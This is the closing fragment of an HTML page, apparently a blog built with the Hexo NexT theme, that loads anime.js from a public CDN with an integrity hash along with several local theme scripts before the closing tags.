  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
